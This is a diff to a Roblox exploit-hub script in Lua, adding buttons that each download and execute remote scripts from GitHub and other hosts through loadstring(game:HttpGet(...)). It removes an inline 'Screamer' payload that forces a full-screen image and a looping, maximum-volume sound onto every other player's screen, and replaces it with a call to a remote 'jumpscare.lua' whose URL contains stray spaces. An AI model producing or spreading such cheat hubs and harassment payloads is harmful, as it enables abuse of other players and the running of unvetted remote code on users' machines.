@@ -92,32 +92,28 @@ loadstring(game:HttpGet("https://leaf-zeta.onrender.com/api/script"))()
   })       AddButton(Tab3o, {
      Name = "Nhấp ik[🚫]",
     Callback = function()
-	for i,v in pairs(game.Players:GetPlayers()) do
-   if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
-    spawn(function()
-     local newgui = Instance.new("ScreenGui",v.PlayerGui)
-     newgui.Name = "Screamer"
-     local newimage = Instance.new("ImageLabel",newgui)
-     newimage.Image = "http://www.roblox.com/asset/?id=107284084185028"
-     newimage.Size = UDim2.new(1,1,1,1)
-     local s = Instance.new("Sound",newgui)
-     s.SoundId = "rbxassetid://6018028320"
-     s.Volume = 9999999999999999999999999999999999999
-     s.Looped = true
-     s:Play()
-     print("Screamed "..v.Name)
-     while wait(9.4) do
- 
-      newimage.Parent:Destroy()
- 
-     end
-    end)
-   end
-  end
+	Loadstring(game:HttpGet("https: //raw.githubusercontent.com /TheqopThe/robax/refs/heads /main/jumpscare.lua"))()
   end
   })       AddButton(Tab1o, {
      Name = "Rubu-hubv6🐱",
     Callback = function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Teddyseetink/Haidepzai/refs/heads/main/TEDDY-FREEMIUM"))()
+  end
+  })       AddButton(Tab1o, {
+     Name = "Server-hopv2🤑",
+    Callback = function()
+	loadstring(game:HttpGet("https://rise-evo.xyz/apiv3/ServerFinder.lua"))()
+  end
+  })       AddButton(Tab1o, {
+     Name = "Trau-robloxv8🤯",
+    Callback = function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/traurobloxdeptrai/traukhoaito/refs/heads/main/traurobloxv8.lua"))()
+  end
+  })       AddButton(Tab1o, {
+     Name = "Bacon-hub🔥😗",
+    Callback = function()
+	repeat wait() until game:IsLoaded() and game.Players.LocalPlayer 
+getgenv().team = "Pirates" -- Pirates or Marines
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vinh129150/hack/refs/heads/main/BaconHub.lua"))()
   end
   })
